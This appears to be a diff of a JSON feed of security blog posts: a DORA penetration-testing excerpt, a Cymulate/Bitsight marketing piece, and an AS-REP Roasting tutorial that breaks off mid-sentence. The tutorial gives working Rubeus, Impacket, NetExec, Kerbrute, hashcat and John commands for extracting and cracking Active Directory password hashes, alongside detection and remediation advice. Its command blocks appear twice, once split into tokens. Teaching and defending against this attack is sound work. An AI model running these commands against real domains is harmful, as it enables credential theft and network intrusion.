penetration testing, or is a security questionnaire enough?\nA questionnaire won’t satisfy DORA. Article 26 requires designated significant entities to undergo threat-led penetration testing at least every three years, against live production systems, following the TIBER-EU methodology—with findings and remediation plans reported back to the authorities. It’s a testing mandate, not a self-assessment.\nYou Might Also Be Interested In\nBlog\nThe Four Critical Operational Characteristics of an Effective CTEM Program\nRead More\nBlog\nDoes Your CTEM Program Have an AI Blind Spot?\nRead More\nWebinars\nTake Command of Risk: Operationalizing CTEM with SafeBreach Helm\nRead More\nGet the latest\nresearch and news",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "browser",
+      "content_source_url": "https://www.safebreach.com/blog/ctem-evidence-regulatory-compliance-validation/",
+      "content_chars": 16589,
+      "content_sha256": "eda6d9253a152c6b022fc7d962bee8c14816d0f93da6e265676b3b4ead3d206c",
+      "content_fetched_at": "2026-08-03T22:14:50.888144+00:00",
+      "author": "safebreach-blog",
+      "author_name": "SafeBreach Blog",
+      "author_url": "https://www.safebreach.com/blog/",
+      "published_at": "2026-08-03T22:12:48.983315+00:00",
+      "collected_at": "2026-08-03T22:12:48.983315+00:00",
+      "tags": [
+        "kind:publish",
+        "src:safebreach-blog",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://www.safebreach.com/blog/",
+        "https://www.safebreach.com/blog/ctem-evidence-regulatory-compliance-validation/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "safebreach-blog",
+          "url": "https://www.safebreach.com/blog/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "safebreach-blog",
+          "name": "SafeBreach Blog",
+          "home_url": "https://www.safebreach.com/blog/"
+        },
+        "article": {
+          "title": "Thought LeadershipAug 3 , 2026CTEM Has a Silent E—and It Stands for EvidenceRead More",
+          "url": "https://www.safebreach.com/blog/ctem-evidence-regulatory-compliance-validation/",
+          "content_sha256": "eda6d9253a152c6b022fc7d962bee8c14816d0f93da6e265676b3b4ead3d206c"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "browser"
+      }
+    },
+    {
+      "id": "a:cf89b1d3159d3991",
+      "who": "cymulate-blog",
+      "who_url": "https://cymulate.com/blog/",
+      "action": "publish",
+      "target": "How Bitsight + Cymulate Turn Threat Intelligence into Validated ResilienceRead More",
+      "target_url": "https://cymulate.com/blog/bitsight-cymulate-threat-intelligence-validation/",
+      "text": "cymulate-blog published: How Bitsight + Cymulate Turn Threat Intelligence into Validated ResilienceRead More",
+      "at": "2026-08-03T22:12:48.983315+00:00",
+      "external_id": "a:cf89b1d3159d3991",
+      "url": "https://cymulate.com/blog/bitsight-cymulate-threat-intelligence-validation/",
+      "title": "How Bitsight + Cymulate Turn Threat Intelligence into Validated ResilienceRead More",
+      "content": "How Bitsight + Cymulate Turn Threat Intelligence into Validated Resilience\nBy:\nAvigayil Stein\nAugust 3, 2026\nSecurity teams rely on threat intelligence to understand the adversaries, campaigns and vulnerabilities that matter most. But intelligence alone doesn't prove whether security controls can stop those threats.\nThe Bitsight and Cymulate integration bridges that gap. By combining Bitsight Threat Intelligence with Cymulate Exposure Validation, organizations can prioritize the threats most relevant to their environment, validate security controls against real-world adversary behavior and continuously improve cyber resilience.\nWhy Bitsight Threat Intelligence needs continuous validation\nSecurity teams often have threat intelligence, exposure data and validation results, but these workflows are usually disconnected.\nCyber threat intelligence (CTI) teams may identify the adversaries and campaigns most relevant to the organization, but that intelligence does not always translate into action. SOC and detection engineering teams still need to determine whether existing controls can detect or prevent relevant adversary behavior. Security validation teams need to know which scenarios to prioritize. Security leaders need evidence that investments are improving readiness against real threats.\nThis creates manual work across the security workflow:\nTranslating adversary intelligence into validation scenarios\nMapping TTPs and IoCs to executable tests\nInterpreting prevention and detection results separately from threat context\nPrioritizing remediation based on assumptions instead of validated exposure\nProving whether security improvements reduced risk against relevant threats\nThis matters now because adversary activity changes quickly, threat intelligence volume continues to grow and security teams have limited resources. The teams that can connect intelligence to validation can focus on the threats that matter most and prove whether defenses are improving over time.\nHow the Cymulate + Bitsight integration works\nThe integration creates a two-way workflow between adversary intelligence and exposure validation.\nBitsight brings context on relevant adversaries, campaigns, TTPs, IoCs, infrastructure, targeting patterns and CVEs. Cymulate Vero AI maps that context to executable validation scenarios and findings, helping teams validate whether security controls can prevent or detect the techniques and indicators associated with relevant ransomware groups, APTs, malware families and campaigns.\nThe workflow helps teams move from intelligence to action:\n1. Bitsight identifies relevant adversaries, TTPs, IoCs and CVEs.\n2. Cymulate highlights relevant MITRE techniques through targeted threat intel.\n3. Cymulate Vero AI connects those techniques to relevant scenarios and findings.\n4. Teams validate prevention and detection coverage.\n5. Cymulate provides remediation guidance, automated mitigation options and retesting.\n6. Validation results can flow back into Bitsight, enriching adversary, TTP and CVE views with evidence of whether relevant techniques and indicators are prevented or detected in the customer environment.\nMany threat intelligence integrations stop at importing indicators or enriching dashboards. Cymulate and Bitsight go further by turning adversary intelligence into validation activity and connecting validation results back to the intelligence workflow.\nIn practice, Bitsight-prioritized techniques appear directly in Cymulate through the MITRE heatmap and targeted threat intel, so teams can move from intelligence into validation, remediation guidance and retesting.\nBenefits of the Bitsight and Cymulate integration\nWith Bitsight and Cymulate, security teams can move from broad threat awareness to evidence-based action.\nPrioritized validation:\nFocus testing on the adversaries, techniques, IoCs and CVEs most relevant to the organization.\nEvidence-based control assurance:\nProve whether security controls prevent or detect real-world adversary behavior.\nFaster remediation:\nUse Cymulate remediation guidance, automated mitigation and retesting to close validated gaps.\nMore actionable CTI:\nConnect threat intelligence to validation outcomes instead of leaving it as static context.\nStronger reporting:\nShow progress with evidence of improved resilience against relevant threats.\nThe result is a clearer path from threat awareness to measurable improvements in cybersecurity.\nTurn threat intelligence into validated security\nThreat intelligence tells teams what to care about. Exposure validation proves whether the organization is prepared.\nBy integrating Bitsight adversary intelligence with Cymulate continuous exposure validation, security teams can understand which threats are relevant, whether controls are working, which gaps require action and whether remediation improved protection.\nInstead of moving from intelligence to assumptions, teams can move from intelligence to proof.\nThat is how organizations turn real-world adversary behavior into stronger defenses.\nAlready a Cymulate customer?\nIf you are using Bitsight Threat Intelligence, you can use the Cymulate Platform to prioritize validation based on relevant adversary intelligence and validate whether your controls prevent or detect the threats that matter most to your organization. Contact your account manager for guidance on enabling the integration, supported workflows and best practices for your environment.\nEvaluating Cymulate or Bitsight?\nRequest a demo\nto see how Cymulate and Bitsight help your team prioritize validation based on relevant adversary intelligence, prove whether controls are working and close the gaps that matter most.\nAvigayil Stein\nAvigayil is a Product Marketing Manager at Cymulate. With a background in marketing B2B SaaS products, she aspires to spread the word about the benefits of a proactive and continuous cybersecurity program.\nMore about Author\nTable of Contents\nWhy Bitsight Threat Intelligence needs continuous validation\nHow the Cymulate + Bitsight integration works\nBenefits of the Bitsight and Cymulate integration\nTurn threat intelligence into validated security\nAlready a Cymulate customer?\nEvaluating Cymulate or Bitsight?\nCymulate Exposure Validation\nmakes advanced security testing fast and easy. When it comes to building custom attack chains, it's all right in front of you in one place.\nMike Humbert\n,\nCybersecurity Engineer\nDARLING INGREDIENTS INC.\nLearn More\nFeatured Resources\nView More Resources\nSolution Brief\nBitsight + Cymulate\nPrioritize threats, validate security controls and strengthen cyber resilience with Bitsight and Cymulate.\nRead More\nData Sheet\nCymulate Exposure Validation\nProve security readiness with AI-powered exposure validation that continuously tests threats and strengthens defenses.\nRead More\nblog\nMITRE ATT&CK v19 Unpacked: What Changed and How to Operationalize\nSee how MITRE ATT&CK is evolving beyond detection with two new tactics focused on resilience and response.\nRead More\nGET A PERSONALIZED DEMO\nReady to see Cymulate in action?\nBook a Demo",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://cymulate.com/blog/bitsight-cymulate-threat-intelligence-validation/",
+      "content_chars": 7056,
+      "content_sha256": "c999dd9b365da1782cd4ff5afea5ecbf342a5e757b8bb1693990ba68b27d4957",
+      "content_fetched_at": "2026-08-03T22:15:32.254275+00:00",
+      "author": "cymulate-blog",
+      "author_name": "Cymulate Blog",
+      "author_url": "https://cymulate.com/blog/",
+      "published_at": "2026-08-03T22:12:48.983315+00:00",
+      "collected_at": "2026-08-03T22:12:48.983315+00:00",
+      "tags": [
+        "kind:publish",
+        "src:cymulate-blog",
+        "via:llm",
+        "channel:html_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://cymulate.com/blog/",
+        "https://cymulate.com/blog/bitsight-cymulate-threat-intelligence-validation/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "cymulate-blog",
+          "url": "https://cymulate.com/blog/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "cymulate-blog",
+          "name": "Cymulate Blog",
+          "home_url": "https://cymulate.com/blog/"
+        },
+        "article": {
+          "title": "How Bitsight + Cymulate Turn Threat Intelligence into Validated ResilienceRead More",
+          "url": "https://cymulate.com/blog/bitsight-cymulate-threat-intelligence-validation/",
+          "content_sha256": "c999dd9b365da1782cd4ff5afea5ecbf342a5e757b8bb1693990ba68b27d4957"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "llm",
+        "collect_mode": "html_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:911c43c2301315d7",
+      "who": "denizhalil-blogs",
+      "who_url": "https://denizhalil.com/blogs/",
+      "action": "publish",
+      "target": "What is AS-REP Roasting Exploitation: A Comprehensive Guide",
+      "target_url": "https://denizhalil.com/2026/08/03/as-rep-roasting-attack-guide/",
+      "text": "denizhalil-blogs published: What is AS-REP Roasting Exploitation: A Comprehensive Guide",
+      "at": "2026-08-03T05:35:00+00:00",
+      "external_id": "a:911c43c2301315d7",
+      "url": "https://denizhalil.com/2026/08/03/as-rep-roasting-attack-guide/",
+      "title": "What is AS-REP Roasting Exploitation: A Comprehensive Guide",
+      "content": "Introduction\nAS-REP Roasting is a critical attack technique that exploits a fundamental misconfiguration in Kerberos authentication, particularly within Active Directory environments. This sophisticated attack specifically targets user accounts where Kerberos pre-authentication has been disabled, allowing attackers to extract and crack user password hashes offline without triggering account lockouts or generating significant security alerts. In modern enterprise networks, Active Directory serves as the cornerstone of identity and access management, with Kerberos functioning as the default authentication protocol for Windows environments since Windows 2000.The security of these environments heavily depends on the proper configuration of Kerberos pre-authentication, a security feature designed to prevent unauthorized users from obtaining encrypted credential material without first proving their identity. The pre-authentication mechanism requires users to encrypt a timestamp with their password hash before the Key Distribution Center (KDC) will process authentication requests. When this critical security control is disabled—often for legacy application compatibility or due to administrative oversight—it creates a significant vulnerability that attackers can exploit with minimal technical sophistication. This simple yet effective control prevents attackers from blindly requesting Ticket Granting Tickets (TGTs) and obtaining encrypted material suitable for offline password cracking.\nThe consequences of successful AS-REP Roasting attacks extend far beyond simple credential compromise. Once attackers crack these passwords offline using GPU-accelerated tools, they gain legitimate access to Active Directory resources, enabling lateral movement, privilege escalation, and potentially complete domain compromise. The attack’s stealthy nature makes it particularly dangerous: the offline cracking phase generates no network traffic, avoids account lockout mechanisms, and leaves minimal forensic evidence on domain controllers. Understanding both the technical mechanics of AS-REP Roasting and implementing comprehensive preventive security practices is essential for modern cybersecurity professionals, penetration testers, security operations center (SOC) analysts, and system administrators responsible for protecting Active Directory infrastructure.\nLearning Objectives\nBy reading this article, you will:\nUnderstand the fundamentals of Kerberos protocol and the pre-authentication mechanism\nLearn how AS-REP Roasting attacks operate and the risks they pose\nBecome familiar with popular tools and techniques used to execute this attack\nUnderstand detection and mitigation strategies\nGrasp the key differences between AS-REP Roasting and Kerberoasting\nWhat Is AS-REP Roasting Attack?\nAS-REP Roasting is a credential access technique that targets user accounts in Active Directory where the “Do not require Kerberos pre-authentication” attribute is enabled. This attack exploits a critical security weakness in the Kerberos authentication protocol’s initial authentication exchange. In a properly configured Kerberos environment with pre-authentication enabled, users must first prove their identity by encrypting a timestamp with their password-derived key before the Key Distribution Center (KDC) issues a Ticket Granting Ticket (TGT). This mechanism serves as a critical defense against offline password attacks by ensuring that only users who know the correct password can initiate the authentication process.However, when the pre-authentication requirement is disabled—typically to support legacy applications or systems that don’t support modern Kerberos features—attackers can send an AS-REQ (Authentication Server Request) message for any targeted user account without providing any credentials whatsoever. The Domain Controller, following the account’s configuration, responds with an AS-REP (Authentication Server Response) message containing encrypted data. This response includes a session key and other authentication material encrypted with a key derived from the user’s password hash, typically using RC4-HMAC encryption (encryption type 0x17). The attacker can capture this AS-REP response and extract the encrypted portion, which now contains everything needed for an offline brute-force attack. Unlike online password attacks that generate failed authentication logs and can trigger account lockouts, this offline approach allows unlimited password attempts without any risk of detection or account disruption.\nOnce the AS-REP hash is extracted, attackers leverage GPU-accelerated password cracking tools such as Hashcat or John the Ripper to perform dictionary attacks, rule-based attacks, or brute-force attacks against the captured hash. If the account uses a weak or commonly used password, recovery can occur within seconds to minutes. Even moderately complex passwords may fall within hours or days when subjected to modern cracking rigs equipped with high-performance graphics cards. The cracked password grants the attacker legitimate credentials for the compromised account, enabling them to authenticate to domain resources, move laterally across the network, escalate privileges, and potentially establish persistent access to the environment.\nThis technique exhibits several characteristics that make it particularly attractive to attackers and challenging to defend against:\nTargets high-value accounts:\nAS-REP Roasting typically affects service accounts, machine accounts, and legacy application accounts that often possess elevated privileges or access to sensitive systems and data.\nPassword complexity determines success rate:\nThe time required for successful password recovery is directly proportional to password strength. Accounts with weak passwords (8-12 characters, dictionary words, or common patterns) can be compromised almost instantly, while stronger passwords (15+ characters with high entropy) may resist cracking for extended periods.\nExtremely difficult to detect during exploitation:\nThe offline nature of the password cracking phase makes this attack nearly invisible to security monitoring solutions. While the initial AS-REQ requests generate Event ID 4768 logs, these appear as normal authentication attempts. The actual password cracking occurs on attacker-controlled infrastructure, completely outside the visibility of domain controllers, SIEM platforms, and network monitoring tools.\nHow AS-REP Roasting Works\nAS-REP Roasting follows a systematic, multi-phase attack methodology that exploits the absence of Kerberos pre-authentication. Understanding each stage of this attack chain is crucial for both offensive security practitioners conducting authorized penetration tests and defensive teams implementing detection and mitigation strategies. The attack progresses through five distinct phases, each building upon the previous step to ultimately compromise user credentials and establish unauthorized access to Active Directory resources. The sophistication of AS-REP Roasting lies not in technical complexity, but in its ability to exploit a simple misconfiguration while remaining largely invisible to traditional security monitoring systems. Unlike attacks that generate obvious indicators of compromise, AS-REP Roasting disguises malicious activity within the normal flow of Kerberos authentication traffic. This stealth characteristic, combined with the offline nature of password cracking, makes it one of the most effective credential access techniques in the modern threat landscape.\nThe entire attack can be executed with minimal privileges—in many cases requiring no authentication whatsoever—making it accessible to attackers at the initial reconnaissance stage of an intrusion. Once successful, the compromised credentials provide legitimate access to the domain, allowing attackers to blend seamlessly with normal user activity while conducting further reconnaissance, lateral movement, and privilege escalation operations. Let’s examine each phase of the AS-REP Roasting attack lifecycle in detail:\nPhase 1: Discovery and Account Identification:\nThe attack begins with reconnaissance to identify Active Directory accounts with Kerberos pre-authentication disabled. Attackers use PowerShell commands with Active Directory modules, the PowerView framework’s\nGet-DomainUser -PreauthNotRequired\ncommand, or LDAP queries from Linux environments to filter for accounts where the userAccountControl attribute includes the DONT_REQ_PREAUTH flag. In many environments, these LDAP queries can be performed anonymously without authentication, allowing external attackers to identify vulnerable accounts during the initial reconnaissance phase.\nPhase 2: Sending AS-REQ Messages:\nOnce vulnerable accounts are identified, the attacker sends Authentication Server Request (AS-REQ) messages to the domain controller for each target account. Because pre-authentication is disabled, these requests contain no credentials or proof of identity—just a request for a Ticket Granting Ticket (TGT) for the specified username. Tools like Rubeus on Windows and GetNPUsers.py from Impacket on Linux automate this process, allowing rapid AS-REP requests for multiple accounts.\nPhase 3: Receiving AS-REP Responses:\nWhen the domain controller receives an AS-REQ for an account with pre-authentication disabled, it responds with an AS-REP message without verifying the requester’s identity. This response contains encrypted authentication material encrypted with a key derived from the user’s password, typically using RC4-HMAC encryption (encryption type 0x17), which is approximately 800 times faster to crack than AES-256. The attacker extracts this encrypted blob and formats it for offline password cracking tools.\nPhase 4: Offline Hash Cracking:\nWith the AS-REP hash extracted, the attacker performs offline password cracking on their own infrastructure using GPU-accelerated tools like Hashcat (mode 18200). Modern GPU cracking rigs can test billions of password candidates per hour. Attackers start with dictionary attacks, followed by rule-based attacks, and finally brute-force if necessary. Success depends entirely on password strength—weak passwords fall within seconds, moderate passwords within hours to days.\nPhase 5: Credential Usage and Lateral Movement:\nOnce the password is cracked, the attacker possesses valid domain credentials. These credentials enable legitimate authentication to domain resources and can be used for lateral movement, privilege escalation, data exfiltration, persistence establishment, and further credential harvesting. When the vulnerable accounts are service accounts with elevated privileges, the cracked credentials often provide the foothold needed to progress toward complete domain compromise.\nTools and Techniques to Perform an AS-REP Roasting Attack\nWindows-Based Tools\nRubeus\nis the primary C# toolkit for AS-REP Roasting on Windows systems. This tool automatically identifies and enumerates all domain accounts with pre-authentication disabled, then retrieves their AS-REP hashes\nRubeus.exe asreproast /format:hashcat /outfile:hashes.txt\nRubeus.exe\nasreproast\n/format:hashcat\n/outfile:hashes.txt\nThe basic command queries the entire domain and extracts hashes in Hashcat format. Rubeus supports multiple advanced options for operational security and targeted enumeration:\n# Specify target user\nRubeus.exe asreproast /user:targetuser /domain:domain.local /dc:192.168.1.1\n# Use Kerberos encryption types\nRubeus.exe asreproast /des /format:hashcat\n# Enumerate specific Organizational Unit\nRubeus.exe asreproast /ou:\"OU=Services,DC=domain,DC=local\"\n# Use alternate credentials\nRubeus.exe asreproast /creduser:DOMAIN\\admin /credpassword:PASSWORD\n# Specify target user\nRubeus.exe\nasreproast\n/user:targetuser\n/domain:domain.local\n/dc:192.168.1.1\n# Use Kerberos encryption types\nRubeus.exe\nasreproast\n/des\n/format:hashcat\n# Enumerate specific Organizational Unit\nRubeus.exe\nasreproast\n/ou:\"OU=Services,DC=domain,DC=local\"\n# Use alternate credentials\nRubeus.exe\nasreproast\n/creduser:DOMAIN\n\\a\ndmin\n/credpassword:PASSWORD\nRubeus also supports LDAPS (LDAP over SSL) for secure queries and can output results in both Hashcat and John the Ripper formats.\nLinux-Based Tools\nImpacket’s GetNPUsers.py\nis the standard tool for AS-REP Roasting from Linux environments. It operates in both authenticated and unauthenticated modes, making it highly flexible for different scenarios\n# Unauthenticated enumeration with RPC null session\nimpacket-GetNPUsers -no-pass -dc-ip 10.0.0.1 domain.local/\n# Enumerate specific users from file\nimpacket-GetNPUsers -no-pass -usersfile users.txt -dc-ip 10.0.0.1 domain.local/\n# Authenticated enumeration and hash extraction\nimpacket-GetNPUsers domain.local/username:password -request -format hashcat -outputfile hashes.txt\n# Using NTLM hash for authentication\nimpacket-GetNPUsers -hashes 'LM:NT' -dc-ip 10.0.0.1 domain.local/username\n# Unauthenticated enumeration with RPC null session\nimpacket-GetNPUsers\n-no-pass\n-dc-ip\n10.0\n.0.1\ndomain.local/\n# Enumerate specific users from file\nimpacket-GetNPUsers\n-no-pass\n-usersfile\nusers.txt\n-dc-ip\n10.0\n.0.1\ndomain.local/\n# Authenticated enumeration and hash extraction\nimpacket-GetNPUsers\ndomain.local/username:password\n-request\n-format\nhashcat\n-outputfile\nhashes.txt\n# Using NTLM hash for authentication\nimpacket-GetNPUsers\n-hashes\n'LM:NT'\n-dc-ip\n10.0\n.0.1\ndomain.local/username\nThe\n-request\nflag initiates TGT requests and extracts crackable hashes, while\n-format hashcat\nensures output compatibility with Hashcat.\nCrackMapExec / NetExec\nCrackMapExec and its successor NetExec provide integrated LDAP-based AS-REP Roasting capabilities:\n# Authenticated enumeration\nnxc ldap 192.168.0.104 -u username -p password --asreproast output.txt\n# Unauthenticated with userlist\nnxc ldap 192.168.0.104 -u users.txt -p '' --asreproast output.txt\n# Specify domain controller\nnxc ldap 192.168.0.104 -u username -p password --asreproast output.txt -dc-ip 10.0.0.1\n# Authenticated enumeration\nnxc\nldap\n192.168\n.0.104\n-u\nusername\n-p\npassword\n--asreproast\noutput.txt\n# Unauthenticated with userlist\nnxc\nldap\n192.168\n.0.104\n-u\nusers.txt\n-p\n''\n--asreproast\noutput.txt\n# Specify domain controller\nnxc\nldap\n192.168\n.0.104\n-u\nusername\n-p\npassword\n--asreproast\noutput.txt\n-dc-ip\n10.0\n.0.1\nKerbrute\nKerbrute performs username enumeration and pre-authentication detection, providing reconnaissance data before AS-REP Roasting attacks:\n# Enumerate valid usernames\nkerbrute userenum --dc 10.0.0.1 -d domain.local users.txt\n# Manually test pre-authentication with GetTGT\nimpacket-getTGT.py domain.local/username -no-pass -dc-ip 10.0.0.1\n# Enumerate valid usernames\nkerbrute\nuserenum\n--dc\n10.0\n.0.1\n-d\ndomain.local\nusers.txt\n# Manually test pre-authentication with GetTGT\nimpacket-getTGT.py\ndomain.local/username\n-no-pass\n-dc-ip\n10.0\n.0.1\nPassword Cracking Tools\nHashcat Mode 18200\n(Kerberos 5, etype 23, AS-REP) is the standard for cracking AS-REP hashes. Performance varies significantly based on GPU hardware and encryption type:\n# Basic dictionary attack\nhashcat -m 18200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n# Rule-based attack with optimizations\nhashcat -m 18200 -a 0 hashes.txt rockyou.txt -r best64.rule\n# Benchmark GPU performance\nhashcat -m 18200 -b\n# Basic dictionary attack\nhashcat\n-m\n18200\n-a\n0\nhashes.txt\n/usr/share/wordlists/rockyou.txt\n# Rule-based attack with optimizations\nhashcat\n-m\n18200\n-a\n0\nhashes.txt\nrockyou.txt\n-r\nbest64.rule\n# Benchmark GPU performance\nhashcat\n-m\n18200\n-b\nJohn the Ripper\nprovides an alternative cracking method with native Kerberos support:\n# Crack AS-REP hashes\njohn --wordlist=rockyou.txt --format=krb5asrep hashes.txt\n# Using rules\njohn --wordlist=rockyou.txt --rules=best64 --format=krb5asrep hashes.txt\n# Crack AS-REP hashes\njohn\n--wordlist=rockyou.txt\n--format=krb5asrep\nhashes.txt\n# Using rules\njohn\n--wordlist=rockyou.txt\n--rules=best64\n--format=krb5asrep\nhashes.txt\nDetection and Defense Methods\nDetection Techniques\nWindows Event Log Analysis:\nEvent ID 4768 (Kerberos Authentication Ticket Request) is the primary indicator for AS-REP Roasting detection and should be a critical component of any Kerberos attack monitoring strategy. The security audit log captures all TGT requests, providing valuable intelligence when properly analyzed. Security teams should establish baseline profiles for normal authentication patterns and monitor for deviations that indicate potential AS-REP Roasting activity:\nPre-Auth Type: 0\n– Indicates no pre-authentication was performed; legitimate clients should show higher values (typically 2 for PA-ENC-TIMESTAMP)\nService Name: krbtgt\n– The target service for TGT requests; watching for unusual requesters helps identify reconnaissance\nTicket Encryption Type: 0x17\n– RC4-HMAC encryption; should be replaced with 0x12 (AES-256-CTS-HMAC-SHA1-96) in secure environments\nSource IP address\n– Multiple requests from the same source, especially external IPs, indicate automated enumeration\nSuspicious patterns include rapid sequences of 4768 events from a single source querying multiple accounts with Pre-Auth Type 0 and RC4 encryption, unsuccessful AS-REQ attempts followed by successful ones after password cracking, or requests from uncommon hours that deviate from established usage patterns.\nLDAP Query Monitoring:\nMonitor Active Directory and domain controller logs for LDAP queries targeting account attributes that reveal pre-authentication status. Attackers use LDAP reconnaissance to identify vulnerable accounts, searching for the\nuserAccountControl\nattribute with the\nDONT_REQ_PREAUTH\nflag (decimal value 4194304, hexadecimal 0x400000). Tools like PowerView’s\nGet-DomainUser -PreauthNotRequired\ncmdlet generate LDAP traffic that can be detected through Directory Services log analysis. Enable Directory Services event logging on domain controllers and monitor for filter patterns that specifically query\nuserAccountControl\nvalues. Alert on multiple LDAP queries for this attribute within short time windows, particularly from non-administrative source IPs.\nHoneypot Accounts:\nDeploy decoy user accounts configured with pre-authentication disabled and assigned strong, random passwords that resist practical cracking attempts. These honeypot accounts should have no legitimate business purpose and should never receive legitimate AS-REQ requests. Any authentication attempt targeting these accounts with Pre-Auth Type 0 serves as a high-fidelity detection signal indicating active reconnaissance or exploitation. Place honeypot accounts in organizational units with restricted access and monitor their Event ID 4768 events exclusively. This approach minimizes false positives while maintaining high detection confidence.\nDefense Strategies\nEnforce Kerberos Pre-Authentication:\nThe most effective and fundamental defense is enabling pre-authentication for all Active Directory accounts. Pre-authentication verification prevents offline hash cracking by requiring users to prove identity before credential material is issued. Use PowerShell to identify and remediate vulnerable accounts across the entire domain:\n# Find all accounts without pre-authentication\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object Name, SamAccountName\n# Enable pre-authentication for all vulnerable accounts\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Set-ADUser -DoesNotRequirePreAuth $false\n# Verify remediation\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true}\n# Find all accounts without pre-authentication\nGet-ADUser\n-\nFilter {DoesNotRequirePreAuth\n-eq\n$true\n}\n-\nProperties DoesNotRequirePreAuth\n|\nSelect-Object\nName\n,\nSamAccountName\n# Enable pre-authentication for all vulnerable accounts\nGet-ADUser\n-\nFilter {DoesNotRequirePreAuth\n-eq\n$true\n}\n|\nSet-ADUser\n-\nDoesNotRequirePreAuth\n$false\n# Verify remediation\nGet-ADUser\n-\nFilter {DoesNotRequirePreAuth\n-eq\n$true\n}\nBefore enabling pre-authentication for service accounts, verify that applications support modern Kerberos authentication. For legacy applications requiring pre-authentication disabled, develop migration plans or implement isolated authentication mechanisms.\nImplement Strong Password Policies:\nEnforce comprehensive password requirements that make offline cracking computationally prohibitive:\nMinimum 25+ characters for service accounts\n– Even with GPU acceleration, 25-character random passwords require years to crack\nComplexity requirements\n– Uppercase, lowercase, numbers, special characters reduce dictionary attack effectiveness\nRegular password rotation\n– Implement 30-90 day rotation cycles for service accounts\nPassword history enforcement\n– Prevent reuse of previous passwords\nAvoid dictionary words\n– Mandate random generation rather than human-creatable passwords\nApply stricter policies to privileged accounts (domain admins, service accounts, managed service accounts) than standard user accounts.\nDisable RC4 Encryption:\nTransition from RC4-HMAC (encryption type 0x17) to AES-256-CTS-HMAC-SHA1-96 (encryption type 0x12) for all Kerberos tickets. RC4 is approximately 800 times faster to crack than AES-256, making the encryption type itself a significant security lever. Configure the\nmsDS-SupportedEncryptionTypes\nattribute to enforce AES encryption across the domain\n# View current encryption types for an account\nGet-ADUser -Identity \"targetuser\" -Properties msDS-SupportedEncryptionTypes\n# Set account to AES only\nSet-ADUser -Identity \"targetuser\" -Replace @{\"msDS-SupportedEncryptionTypes\"=24}\n# 24 = AES128-CTS-HMAC-SHA1-96 (0x08) + AES256-CTS-HMAC-SHA1-96 (0x10) + RC4-HMAC (legacy, for compatibility)\n# View current encryption types for an account\nGet-ADUser\n-\nIdentity\n\"targetuser\"\n-\nProperties msDS\n-\nSupportedEncryptionTypes\n# Set account to AES only\nSet-ADUser\n-\nIdentity\n\"targetuser\"\n-Replace\n@\n{\n\"msDS-SupportedEncryptionTypes\"\n=\n24\n}\n# 24 = AES128-CTS-HMAC-SHA1-96 (0x08) + AES256-CTS-HMAC-SHA1-96 (0x10) + RC4-HMAC (legacy, for compatibility)\nFor full security, use value 16 (AES256 only) once legacy compatibility requirements are met.\nAS-REP Roasting vs. Kerberoasting: Key Differences\nUnderstanding the distinctions between AS-REP Roasting and Kerberoasting is essential for cybersecurity professionals implementing effective detection and defense strategies. While both attacks exploit Kerberos weaknesses to harvest password hashes, they operate at different stages of the authentication protocol and require different prerequisites, making them complementary techniques in a sophisticated attacker’s arsenal.\nAspect\nAS-REP Roasting\nKerberoasting\nTarget\nUsers with pre-authentication disabled\nUsers/SPNs registered in Active Directory\nRequired Access\nNone (unauthenticated possible)\nValid domain user credentials required\nKerberos Exchange\nAS-REQ → AS-REP (2 messages)\nAS-REQ → AS-REP + TGS-REQ → TGS-REP (4 messages)\nEncrypted Material\nTGT encrypted with user password hash\nService ticket encrypted with service account password hash\nEncryption Type\nTypically RC4-HMAC (0x17) only\nRC4-HMAC or AES (depends on configuration)\nTypical Targets\nLegacy apps, dormant accounts, service accounts\nService accounts, sometimes high-value users\nEvent ID Indicators\nEvent ID 4768 with Pre-Auth Type 0\nEvent ID 4769 (TGS request) anomalies\nDetection Difficulty\nMore challenging (offline phase invisible)\nEasier (TGS requests visible in logs)\nSkill Level Required\nLow (minimal protocol knowledge needed)\nLow-Medium (requires domain access)\nConclusion\nAS-REP Roasting represents a significant and persistent threat to Active Directory environments worldwide, particularly when Kerberos pre-authentication is disabled due to legacy application requirements, system migrations, or administrative oversights. The attack’s accessibility—requiring no credentials, minimal technical sophistication, and often no more than standard penetration testing tools—makes it one of the most frequently observed Kerberos-based attacks in both defensive assessments and real-world intrusions. The combination of low barrier to entry, high success rate against weak passwords, and near-complete invisibility during the offline cracking phase makes AS-REP Roasting an especially attractive attack vector for adversaries ranging from unsophisticated threat actors to advanced persistent threat (APT) groups. The attack’s effectiveness stems from the fundamental security principle that disabled security controls create vulnerabilities proportional to their criticality. Pre-authentication is not an optional hardening measure; it is a core component of Kerberos security designed specifically to prevent offline password attacks. Organizations that disable this control, even with justifiable business reasons for legacy application support, accept significant security risk if they lack compensating controls. The problem compounds when organizations maintain inventory gaps—not knowing which accounts have pre-authentication disabled, unable to quantify their exposure, or lacking the 